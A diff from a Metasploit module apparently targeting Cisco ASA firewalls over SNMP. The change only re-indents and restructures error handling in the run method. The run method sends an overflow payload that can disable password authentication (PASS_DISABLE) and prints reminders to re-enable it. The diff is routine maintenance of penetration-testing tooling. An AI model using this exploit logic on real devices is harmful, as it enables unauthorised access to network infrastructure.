@@ -170,38 +170,36 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    begin
-      vers_string = retrieve_asa_version
+    vers_string = retrieve_asa_version
 
-      print_status("Building #{action.name} payload for version #{vers_string}...")
-      overflow = build_payload(vers_string, action.name)
-      payload = SNMP::ObjectId.new(overflow)
+    print_status("Building #{action.name} payload for version #{vers_string}...")
+    overflow = build_payload(vers_string, action.name)
+    payload = SNMP::ObjectId.new(overflow)
 
-      print_status('Sending SNMP payload...')
-      response = snmp.get_bulk(0, 1, [SNMP::VarBind.new(payload)])
+    print_status('Sending SNMP payload...')
+    response = snmp.get_bulk(0, 1, [SNMP::VarBind.new(payload)])
 
-      if response.varbind_list
-        print_good('Clean return detected!')
-        if action.name == 'PASS_DISABLE'
-          print_warning("Don't forget to run PASS_ENABLE after logging in!")
-          print_warning('  set ACTION PASS_ENABLE')
-        end
+    if response.varbind_list
+      print_good('Clean return detected!')
+      if action.name == 'PASS_DISABLE'
+        print_warning("Don't forget to run PASS_ENABLE after logging in!")
+        print_warning('  set ACTION PASS_ENABLE')
       end
-    rescue ::Rex::ConnectionError
-      print_error('Connection Error: Is the target up?')
-    rescue ::SNMP::RequestTimeout
-      print_error('SNMP Error: Request Timeout, Cisco ASA may have crashed :/')
-    rescue ::SNMP::UnsupportedVersion
-      print_error('SNMP Error: Version 2c is not supported by target.')
-    rescue ::NoMethodError
-      print_error("Error: No payload available for version #{vers_string}")
-    rescue ::Interrupt
-      raise $ERROR_INFO
-    rescue ::StandardError => e
-      print_error("Error: #{e.class} #{e} #{e.backtrace}")
-    ensure
-      disconnect_snmp
     end
+  rescue ::Rex::ConnectionError
+    print_error('Connection Error: Is the target up?')
+  rescue ::SNMP::RequestTimeout
+    print_error('SNMP Error: Request Timeout, Cisco ASA may have crashed :/')
+  rescue ::SNMP::UnsupportedVersion
+    print_error('SNMP Error: Version 2c is not supported by target.')
+  rescue ::NoMethodError
+    print_error("Error: No payload available for version #{vers_string}")
+  rescue ::Interrupt
+    raise $ERROR_INFO
+  rescue ::StandardError => e
+    print_error("Error: #{e.class} #{e} #{e.backtrace}")
+  ensure
+    disconnect_snmp
   end
 
   def retrieve_asa_version
